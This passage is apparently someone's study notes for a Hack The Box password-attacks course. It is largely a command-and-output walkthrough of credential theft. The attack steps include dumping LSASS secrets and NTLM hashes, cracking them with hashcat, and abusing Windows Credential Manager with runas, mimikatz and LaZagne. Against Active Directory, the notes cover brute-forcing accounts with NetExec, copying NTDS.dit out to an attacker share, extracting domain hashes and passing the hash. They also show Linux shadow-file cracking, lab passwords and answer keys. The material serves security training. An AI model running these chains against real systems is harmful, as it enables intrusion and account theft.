		sha1_masterkey 6c3046d0bc927cdfd9b4503c6115034018dbddd1
	== DPAPI [3e7]==
		luid 999
		key_guid 76bb8676-5b2c-4f03-b81a-d013595af401
		masterkey ee1f242fb9f9a5cade04b7cc07ffd0fe5dd5d56a38e79963af87862a5c0ce6e8f0b033d0f7f41f0d8ea757cdd76413f9b8ad6b5d5715734bb9254c4d26ce0943
		sha1_masterkey ca67ee91ed3682d338bdf6b0c72990749c0cbc00
	== DPAPI [3e7]==
		luid 999
		key_guid 0c1b6c0a-191d-4839-8cf5-22ca4c3e5880
		masterkey dccd4056a5b0cc8211193669e6aea7755eeccd393adf0e5efa1f2a571c96039a7dbe05c9082c44f85b3080bb908eb41fb9f860174cd365e655f3d5788d5a8427
		sha1_masterkey efddd94b4348303e90c8d7285e8b65738196dc86
	== DPAPI [3e7]==
		luid 999
		key_guid 0453985c-7220-49f4-b024-79acf0de7874
		masterkey aaf3cdd36cf0d10871efd0d78a527664afc58078e84d49734f372fbb09e209538f606e0c5f0481b9f4d6ac6efb9a3631f16e38737a1b3cc15d0db42b63ebc90e
		sha1_masterkey 1d77f450edb6c76d14838b5b351672f35eec615f
	== DPAPI [3e7]==
		luid 999
		key_guid c19ecbf1-ea92-487e-a2d4-419f60a62360
		masterkey 387a060baf6887038b7ff133cd0eb4712ecdf531c16030a82395db368e6b2cda563dd026ccb815e1fb85215281a5437f085e3a5ca47fe9038e7e072f46270d74
		sha1_masterkey 5b07ca8e21e100937af4ab6d3f2482c745245436
	== DPAPI [3e7]==
		luid 999
		key_guid 6c61536b-7453-4ffa-911b-693858aef0c9
		masterkey 0c5f662bf8f65c75b773e4698606db1e2e387ad18a9c4fdee25e0dbac6eb7c04e04874d1910aba465ef3380a92b46231d7a781df2f5e38d2621e06c7476b222f
		sha1_masterkey cbabadd23d93b47ec94ac604ac91945135c5a097

== LogonSession ==
authentication_id 546341 (85625)
session_id 2
username htb-student
domainname FS01
logon_server FS01
logon_time 2026-07-01T20:36:05.238459+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 546341
	== MSV ==
		Username: htb-student
		Domain: FS01
		LM: NA
		NT: 3c0e5d303ec84884ad5c3b7876a06ea6
		SHA1: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [85625]==
		username htb-student
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: htb-student
		Domain: FS01
	== WDIGEST [85625]==
		username htb-student
		domainname FS01
		password None
		password (hex)
	== DPAPI [85625]==
		luid 546341
		key_guid c75b5a96-7d80-4511-8bb8-474e3c09670f
		masterkey 12e8cc72d4d672d492fc8878c736aea970e11d74e87061fe779ce8884c9f0cb20cd0db541f95440ed8c4d527a91682fb7721ba397700932a49c8dbb7120cd2c8
		sha1_masterkey a34f57ba87672c43f091934906052ac4cf7364f7

== LogonSession ==
authentication_id 525359 (8042f)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2026-07-01T20:36:04.332204+00:00
sid S-1-5-90-0-2
luid 525359
	== WDIGEST [8042f]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [8042f]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 73559 (11f57)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-07-01T20:26:34.832213+00:00
sid S-1-5-90-0-1
luid 73559
	== WDIGEST [11f57]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [11f57]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username FS01$
domainname WORKGROUP
logon_server 
logon_time 2026-07-01T20:26:34.644705+00:00
sid S-1-5-20
luid 996
	== WDIGEST [3e4]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== Kerberos ==
		Username: fs01$
		Domain: WORKGROUP
	== WDIGEST [3e4]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 42780 (a71c)
session_id 0
username 
domainname 
logon_server 
logon_time 2026-07-01T20:26:34.207210+00:00
sid None
luid 42780

== LogonSession ==
authentication_id 127254 (1f116)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2026-07-01T20:26:37.179705+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 127254
	== MSV ==
		Username: Vendor
		Domain: FS01
		LM: NA
		NT: 31f87811133bc6aaa75a536e77f64314
		SHA1: 2b1c560c35923a8936263770a047764d0422caba
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [1f116]==
		username Vendor
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: Vendor
		Domain: FS01
	== WDIGEST [1f116]==
		username Vendor
		domainname FS01
		password None
		password (hex)

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2026-07-01T20:26:34.988455+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username: 
		Domain: 
```



We should see the `NT`:

```bash
hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt

31f87811133bc6aaa75a536e77f64314:Mic@123                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 31f87811133bc6aaa75a536e77f64314
Time.Started.....: Wed Jul  1 16:51:38 2026 (1 sec)
Time.Estimated...: Wed Jul  1 16:51:39 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3809.6 kH/s (0.54ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2113536/14344384 (14.73%)
Rejected.........: 0/2113536 (0.00%)
Restore.Point....: 2105344/14344384 (14.68%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: PECKER401 -> MOVEON
Hardware.Mon.#1..: Temp: 40c Util: 21%

Started: Wed Jul  1 16:51:35 2026
Stopped: Wed Jul  1 16:51:40 2026

```

The password is `Mic@123`.

# Attacking Windows Credential Manager



## What is Credential Manager?

Built into Windows since Server 2008 R2/ Windows 7. Stores encrypted credentials for websites, network resources, domain users, and services.
Two types:


| Type                    | Description                                           |
| ----------------------- | ----------------------------------------------------- |
| **Web Credentials**     | Websites/online accounts — used by IE and legacy Edge |
| **Windows Credentials** | Domain users, network shares, services, OneDrive      |


Stored in encrypted vault folders protected by DPAPI:

```cmd
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

Each vault contains a `Policy.vpol` file with AES-128/256 keys protected by DPAPI masterkeys.

### Enumerate Stored Credentials

```cmd
cmdkey /list
```



### Output fields:


| Field         | Meaning                                        |
| ------------- | ---------------------------------------------- |
| `Target`      | Resource the credential is for                 |
| `Type`        | `Generic` or `Domain Password`                 |
| `User`        | Associated username                            |
| `Persistence` | `Local machine persistence` = survives reboots |




## Impersonate a Stored User (runas)

If you find a `Domain:interactive` credential:

```cmd
runas /savecred /user:SRV01\mcharles cmd
# Opens a new cmd session as mcharles using stored creds
# No password prompt — credential is pulled from vault
```

Extract Credentials with Mimikatz

```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```

Dumps credentials stored in Credential Manager from LSASS memory — reveals plaintext passwords for stored accounts including OneDrive, network shares, etc.

Other tools for the same purpose: SharpDPAPI, LaZagne, DonPAPI

### Export Vault (for offline analysis)

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

Opens GUI to export vault to `.crd` file (encrypted with user-supplied password).

## Key Takeaways

- Credential Manager is a high-value target - users often store domain, VPN, and cloud credentials here
- `cmdkey /list` is your first recon step - fast and built-in
- `runas /savecred` allows direct impersonation without knowing the password
- Mimikatz `sekurlsa::credman` extracts plaintext passwords from memory - requires admin + debug privilege
- DPAPI protects the vaults - Credential Guard (on modern Windows with VBS enabled) makes extraction harder



## Connect to HTB



#### What is the password mcharles uses for OneDrive?

```bash
xfreerdp /v:10.129.49.216 /u:sadams /p:'totally2brow2harmon@'
cmdkey /list
Currently stored credentials:

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles

runas /savecred /user:SRV01\mcharles cmd
```

```bash
wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe -O ~/LaZagne.exe

sudo $(which smbserver.py) -smb2support -username sadams -password 'totally2brow2harmon@' CompData /home/mapacheroja22/
```

```bash
net use \\10.10.17.216\CompData /user:sadams totally2brow2harmon@
copy \\10.10.17.216\CompData\mimikatz.exe C:\Users\sadams\mimikatz.exe
C:\Users\sadams\mimikatz.exe

net use \\10.10.17.216\CompData /user:sadams totally2brow2harmon@
copy \\10.10.17.216\CompData\LaZagne.exe C:\Users\sadams\LaZagne.exe

# On mcharles
C:\Users\sadams\LaZagne.exe all


########## User: mcharles ##########

------------------- Credman passwords -----------------

[+] Password found !!!
URL: onedrive.live.com
Login: mcharles@inlanefreight.local
Password: Inlanefreight#2025


[+] 1 passwords have been found.
For more information launch it again with the -v option

elapsed time = 1.2188763618469238
```



# Attacking Active Directory and NTDS.dit



## Overview

When a Windows system joins a domain, authenticaiton shifts from the local SAM database to the Domain Controller (DC). The DC validates credentials against Active Directory, stored in `NTDS.dit`. Compromising this files means compromising every domain account.

### Step 1 - Build a Username List

Common naming conventions:


| Convention             | Example (Jane Doe) |
| ---------------------- | ------------------ |
| `firstinitiallastname` | `jdoe`             |
| `firstname.lastname`   | `jane.doe`         |
| `firstnamelastname`    | `janedoe`          |
| `lastname.firstname`   | `doe.jane`         |


Use Username Anarchy to auto-generate all variants:

```bash
./username-anarchy -i /home/ltnbob/names.txt
```



### Step 2 - Validate Usernames with Kerbrute

```bash
sudo apt install golang -y
go version
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make linux
cd dist/
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
# [+] VALID USERNAME: bwilliamson@inlanefreight.local
```



### Step 3 - Brute-Force AD Credentials with NetExec

```bash
nxc smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
# [+] inlanefrieght.local\bwilliamson:P@55w0rd!
```

> Noisy attack - generates lots of logs (Event ID 4776). No lockout policy by default in Windows domains, but check before spraying.



### Step 4 - Connect to DC with Evil-WinRM

```bash
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

Check privileges

```bash
net localgroup
net user bwilliamson
# Look for Domain Admins membership
```



### Step 5 - Capture NTDS.dit



#### Manual method (VSS)

```bash
# Create shadow copy
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.dit from shadow copy
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Transfer to attack host
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```



#### Fast method (NetExec one-liner)

```bash
nxc smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
# Dumps all hashes directly to /home/user/.nxc/logs/
```



### Step 6 - Extract Hashes with secretsdump

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
# Output: username:RID:lmhash:nthash:::
```

> Like SAM, NTDS.dir hashes are encrypted with the SYSTEM boot key - need both files.



### Step 7 - Crack or Use Hashes



#### Crack NT hash

```bash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```



#### Pass-the-Hash (if cracking fails)

```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```



## Full Atack Chain

```bash
OSINT → employee names
        ↓
Username Anarchy → username list
        ↓
Kerbrute → validate usernames
        ↓
NetExec SMB brute-force → get credentials
        ↓
Evil-WinRM → connect to DC
        ↓
vssadmin / nxc ntdsutil → capture NTDS.dit
        ↓
secretsdump → extract all domain hashes
        ↓
hashcat -m 1000 → crack NT hashes
PtH with evil-winrm → if cracking fails
```



## Connect to HTB



#### What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)

`NTDS.dit`

#### Submit the NT hash associated with the Administrator user from the example output in the section reading.

`64f12cddaa88057e06a81b54e73b949b`

#### On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)

```bash
nano employees.txt
John Marston
Carol Johnson
Jennifer Stapleton

./username-anarchy -i employees.txt > employees-acounts.txt

nxc smb 10.129.50.27
SMB         10.129.50.27    445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False) (Null Auth:True)

cd ../kerbrute/dist
./kerbrute_linux_amd64 userenum --dc 10.129.50.27 --domain ILF.local ../../username-anarchy/employees-acounts.txt
2026/07/01 22:21:31 >  [+] VALID USERNAME:	 jmarston@ILF.local
2026/07/01 22:21:33 >  [+] VALID USERNAME:	 cjohnson@ILF.local
2026/07/01 22:21:33 >  [+] VALID USERNAME:	 jstapleton@ILF.local

nxc smb 10.129.50.27 -u jmarston -p /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt --domain ILF.local

cat > ilf_wordlist.txt << 'EOF'
Inlanefreight
inlanefreight
ILF
ilf
Marston
marston
John
john
Director
director
IT
Password1
Password123
Welcome1
Welcome123
EOF

hashcat --force ilf_wordlist.txt -r /usr/share/hashcat/rules/best64.rule --stdout | sort -u > ilf_mut.txt

cat ilf_mut.txt /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt > combined.txt

nxc smb 10.129.50.27 -u jmarston -p ../combined.txt --domain ILF.local

nxc smb 10.129.50.27 -u jmarston -p /usr/share/wordlists/rockyou.txt --domain ILF.local --ignore-pw-decoding

nxc smb 10.129.50.27 -u jmarston -p ~/usr/share/wordlists/fasttrack.txt --domain ILF.local
SMB         10.129.50.27    445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)

nxc smb 10.129.50.27 -u jmarston -p 'P@ssword!' -M ntdsutil
SMB         10.129.50.27    445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.50.27    445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
NTDSUTIL    10.129.50.27    445    ILF-DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\178296091
NTDSUTIL    10.129.50.27    445    ILF-DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.50.27    445    ILF-DC01         [+] NTDS.dit dumped to C:\Windows\Temp\178296091
NTDSUTIL    10.129.50.27    445    ILF-DC01         [*] Copying NTDS dump to /tmp/tmpkh7jw2_r
NTDSUTIL    10.129.50.27    445    ILF-DC01         [*] NTDS dump copied to /tmp/tmpkh7jw2_r
NTDSUTIL    10.129.50.27    445    ILF-DC01         [+] Deleted C:\Windows\Temp\178296091 remote dump directory
NTDSUTIL    10.129.50.27    445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.50.27    445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:920c2162933725868e4fa446e65ceb6f:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/mapacheroja22/.nxc/logs/ntds/ILF-DC01_10.129.50.27_2026-07-01_225459.ntds of which 7 were added to the database
NTDSUTIL    10.129.50.27    445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.50.27    445    ILF-DC01         [*] grep -iv disabled /home/mapacheroja22/.nxc/logs/ntds/ILF-DC01_10.129.50.27_2026-07-01_225459.ntds | cut -d ':' -f1

nano jhash.txt
92fd67fd2f49d0e83744aa82363f021b

hashcat -m 1000 jhash.txt /usr/share/wordlists/rockyou.txt
92fd67fd2f49d0e83744aa82363f021b:Winter2008               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 92fd67fd2f49d0e83744aa82363f021b
Time.Started.....: Wed Jul  1 23:00:54 2026 (1 sec)
Time.Estimated...: Wed Jul  1 23:00:55 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7011.8 kH/s (0.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2088960/14344384 (14.56%)
Rejected.........: 0/2088960 (0.00%)
Restore.Point....: 2080768/14344384 (14.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Zlatan -> TEAMODARIO
Hardware.Mon.#1..: Temp: 40c Util: 22%
Started: Wed Jul  1 23:00:53 2026
Stopped: Wed Jul  1 23:00:56 2026

Winter2008

```



#### Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

```bash
Winter2008
```



# Credential Hunting in Windows

Searching a compromised system's files and applications for stored credentials after gaining access (e.g., via RDP to an IT admin workstation).

The core idea from this is to base your search on how the system is used. Knowing you're on an IT admin's box helps you predict where credentials live, reducing random guessing. 

Some key terms to search for are:

```bash
password
passphrase
key
username
creds
pwd
login
credentials
dbpassword
configuration
```



## Search tools

- Windows Search (GUI): Searches OS settings and filesystem for keyword matches.
- LaZagne: Third-party tool with modules that extract stored/insecurely-saved passwords from browsers, chat apps, mail clients, memory (KeePass/LSASS), sysadmin tools (OpenVPN/WinSCP), Windows secrets, and WiFi. Run `start Lazagne.exe all` (add `-vv` for verbose). Transfer via xfreerdp copy-paste.
- findstr (CLI): Pattern search across file types:

```bash
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```



## High-value locations to check

- Group Policy / scripts in the SYSVOL share
- `web.config` on dev/IT machines and shares
- `unattend.xml`
- AD user/computer description fields
- KeePass databases (if master password is crackable)
- Files named `pass.txt`, `passwords.docx/xlsx` on user systems, shares, SharePoint



## Takeaway

Many apps store credentials in cleartext or with weak/reversible encryption, making post-exploitation credential hunting fast and high-yield. Tailor your approach to the host's role (Server vs Desktop).

## Connect to HTB



#### What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)

```bash
xfreerdp /v:10.129.202.99 /u:Bob /p:HTB_@cademy_stdnt!

WellConnected123
```



#### What is the GitLab access code Bob uses? (Format: Case-Sensitive)

```bash
3z1ePfGbjWPsTfCsZfjy
```



#### What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)

```bash
wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe

sudo $(which smbserver.py) -smb2support -username Bob -password 'HTB_@cademy_stdnt!' CompData /home/mapacheroja22/
```

```powershell
copy \\10.10.17.216\CompData\LaZagne.exe C:\Users\bob\Desktop\
```

```cmd
start LaZagne.exe all

ubuntu
FSadmin123
```



#### What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)

```bash
Inlanefreightisgreat2022
```



#### What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)

```bash
edgeadmin:Edge@dmin123!
```



# Linux Authentication Process



## PAM (Pluggable Authentication Modules)

Linux commonly uses PAM for authentication. Modules like `pam_unix.so` (found in `/usr/lib/x86_64-linux-gnu/security/` on Debian) handle user info, authentication, sessions, and password changes. When you run `passwd`, PAM is invoked. It reads from and writes to `/etc/passwd` and `/etc/shadow`, and also supports LDAP, Kerberos, and mount modules.

## Passwd file

`/etc/passwd` lists every user and is world-readable. Each entry has 7 colon-separated fields:

```bash
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

Fields:
Username, password, UID, GID, GECOS, Home directory, Default shell.

The Password field matters most:

- `x` -> hash is stored in `/etc/shadow` (normal case).
- An actual hash -> rare, old systems; crackable since the file is world-readable.
- Empty -> no password required. If `/etc/passwd` is mistakenly writeable, an attacker can blank out root's password field:

```bash
head -n 1 /etc/passwd
root::0:0:root:/root:/bin/bash
```

Then log in with no prompt:

```bash
su
```

Watch for misassigned write permissions on `/etc` from inexperienced admins.

## Shadow file

`/etc/shadow` was introduced to protect hashes, it's only readable by root. Same style as oasswd but with 9 fields:

```bash
htb-student:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
```

Fields:
Username, password, Last change, Min age, Max age, Warning period, Inactivity period, Expiration date, Reserved.

- `!` or `*` in the Password field -> no Unix password login (but Kerberos/key auth may still work).
- Empty Password field -> no password needed.

Hash format: `$<id>$<salt>$<hashed>`. The ID identifies the algorithm:


| ID   | Algorithm     |
| ---- | ------------- |
| 1    | MD5           |
| 2a   | Blowfish      |
| 5    | SHA-256       |
| 6    | SHA-512       |
| sha1 | SHA1crypt     |
| y    | Yescrypt      |
| gy   | Gost-yescrypt |
| 7    | Scrypt        |


Modern Debian defaults to yescrypt; older systems may use waker, more crackable algorithms.

## Opasswd

PAM (`pam_unix.so`) blocks password reuse by storing old passwords in `/etc/security/opasswd` (root-only read):

```bash
sudo cat /etc/security/opasswd
```

Multiple old hashes per user are comma-separated. Note the hash type - MD5 (`$1$`) is far easier to crack than SHA-512. Old passwords reveal reuse patterns, improving your chances of guessing current credentials.

## Cracking Linux Credentials

With root access, gather hashes and crack them. `unshadow` (bundled with John the Ripper) merges passwd + shadow into one crackable file:

```bash
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

Then crack with hashcat (mode `1800` = SHA-512crypt):

```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

> Note: This scenario is exactly what JtR's single crack mode was designed for.



## Key takeaways

`passwd` is world-readable (crackable if hashes leak there), `shadow` is root-only, the `$id$` prefix tells you the algorithm (and how crackable it is), and `opasswd` is a goldmine for spotting password-reuse patterns.

## Connect to HTB



#### Download the attached ZIP file (linux-authentication-process.zip), and use single crack mode to find martin's password. What is it?

```bash
cd Desktop

sudo cp passwd /tmp/passwd.bak
sudo cp shadow /tmp/shadow.bak

cd john/run/
./unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

cat unshadowed.hashes

root:!:0:0:root:/root:/usr/bin/zsh
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:*:42:65534::/nonexistent:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:!*:998:998:systemd Network Management:/:/usr/sbin/nologin
_galera:!:100:65534::/nonexistent:/usr/sbin/nologin
mysql:!:101:102:MariaDB Server,,,:/nonexistent:/bin/false
tss:!:102:103:TPM software stack,,,:/var/lib/tpm:/bin/false
strongswan:!:103:65534::/var/lib/strongswan:/usr/sbin/nologin
systemd-timesync:!*:992:992:systemd Time Synchronization:/:/usr/sbin/nologin
rwhod:!:104:65534::/var/spool/rwho:/usr/sbin/nologin
_gophish:!:105:105::/var/lib/gophish:/usr/sbin/nologin
iodine:!:106:65534::/run/iodine:/usr/sbin/nologin
messagebus:!:107:106::/nonexistent:/usr/sbin/nologin
tcpdump:!:108:107::/nonexistent:/usr/sbin/nologin
miredo:!:109:65534::/var/run/miredo:/usr/sbin/nologin
_rpc:!:110:65534::/run/rpcbind:/usr/sbin/nologin
Debian-snmp:!:111:109::/var/lib/snmp:/bin/false
redis:!:112:111::/var/lib/redis:/usr/sbin/nologin
usbmux:!:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mosquitto:!:114:114::/var/lib/mosquitto:/usr/sbin/nologin
redsocks:!:115:115::/var/run/redsocks:/usr/sbin/nologin
stunnel4:!*:991:991:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
sshd:!:116:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:!:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
sslh:!:117:118::/nonexistent:/usr/sbin/nologin
postgres:!:118:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
avahi:!:119:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
_gvm:!:120:122::/var/lib/openvas:/usr/sbin/nologin
speech-dispatcher:!:121:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
inetsim:!:122:124::/var/lib/inetsim:/usr/sbin/nologin
geoclue:!:123:125::/var/lib/geoclue:/usr/sbin/nologin
lightdm:!:124:126:Light Display Manager:/var/lib/lightdm:/bin/false
statd:!:125:65534::/var/lib/nfs:/usr/sbin/nologin
saned:!:126:128::/var/lib/saned:/usr/sbin/nologin
polkitd:!*:989:989:User for polkitd:/:/usr/sbin/nologin
rtkit:!:127:129:RealtimeKit,,,:/proc:/usr/sbin/nologin
colord:!:128:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
nm-openvpn:!:129:131:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
nm-openconnect:!:130:132:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
martin:$6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:1000:1000:Martin Mendes:/home/martin:/usr/bin/zsh
cups-pk-helper:!:131:135:user for cups-pk-helper service,,,:/nonexistent:/usr/sbin/nologin
sarah:$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:1001:1001:Sarah Saragaday:/home/sarah:/usr/bin/bash

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked

cat /tmp/unshadowed.cracked
$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:mariposa
$6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:Martin1

Martin1
```



#### Use a wordlist attack to find sarah's password. What is it?

```bash
mariposa
```



# Credential Hunting in Linux

Once you have a foothold (e.g., reverse shell from a vulnerable web app), hunting for stored credentials is one of the fastest paths to privilege escalation. Always keep the system's role in mind - an isolated DB server won't have normal users, but will have sensitive config.

## Four Credential Sources



